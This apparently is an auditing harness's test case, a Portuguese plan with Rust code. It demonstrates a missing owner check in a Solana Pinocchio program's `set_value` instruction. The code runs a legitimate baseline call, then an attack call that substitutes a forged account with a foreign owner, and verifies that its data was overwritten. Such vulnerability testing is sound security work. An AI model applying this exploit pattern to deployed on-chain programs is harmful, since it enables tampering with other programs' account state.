{
  "plan": "O programa `set_value` (Pinocchio) recebe duas contas: `data_account` (PDA derivado de [b"data", user.key()]) e `user`. Ele valida que `data_account.key()` é o PDA esperado, mas nunca verifica `data_account.owner == program_id`. O baseline chama `set_value` legitimamente com o PDA correto (dono = program_id) e um `user` signer, provando que o cenário está montado. O ataque repete a mesma chamada, mas substitui `data_account` por uma conta forjada com o mesmo endereço PDA porém dono diferente (outro programa), demonstrando que o programa aceita e escreve em uma conta que não lhe pertence. O efeito mede que a conta forjada teve seus bytes [8..40] sobrescritos com a chave do `user` e [40..48] com o valor, apesar do dono estranho.",
  "scenario": "let program_id = env.program_id;

    let user = Pubkey::new_unique();
    let user_account = wallet(1_000_000_000);

    let seeds: &[&[u8]] = &[b"data", user.as_ref()];
    let (pda, bump) = Pubkey::find_program_address(seeds, &program_id);

    // Conta PDA legitima, dona do programa
    let mut legit_data = vec![0u8; 49];
    let legit_account = account(&program_id, &legit_data, None);

    // Conta forjada: mesmo endereco PDA, mas dono diferente (outro programa)
    let attacker_owner = Pubkey::new_unique();
    let mut forged_data = vec![0u8; 49];
    let forged_account = account(&attacker_owner, &forged_data, None);

    let value: u64 = 0xDEADBEEFCAFEBABE;
    let mut ix_data = vec![1u8];
    ix_data.extend_from_slice(&value.to_le_bytes());

    // Baseline: uso legitimo com a conta PDA correta
    let ix_legit = env.raw_ix(
        &ix_data,
        &[
            AccountMeta::new(pda, false),
            AccountMeta::new_readonly(user, true),
        ],
    );
    let contas_legit = vec![
        (pda, legit_account.clone()),
        (user, user_account.clone()),
    ];
    let r_base = env.baseline("set_value legitimo com PDA do programa", &ix_legit, &contas_legit);

    // Ataque: mesma instrucao, mas data_account tem dono diferente
    let ix_attack = env.raw_ix(
        &ix_data,
        &[
            AccountMeta::new(pda, false),
            AccountMeta::new_readonly(user, true),
        ],
    );
    let contas_attack = vec![
        (pda, forged_account.clone()),
        (user, user_account.clone()),
    ];
    let r = env.attack("set_value com conta forjada de outro dono", &ix_attack, &contas_attack);

    if r.program_result == ProgramResult::Success {
        let forged_after = after(&r, &pda);
        let data_after = forged_after.data();
        let user_bytes = user.to_bytes();
        let value_bytes = value.to_le_bytes();
        env.effect(
            "conta forjada (dono != program_id) foi aceita e teve dados sobrescritos",
            data_after.len() >= 49
                && data_after[8..40] == user_bytes
                && data_after[40..48] == value_bytes
                && data_after[48] == bump,
        );
    }"
}

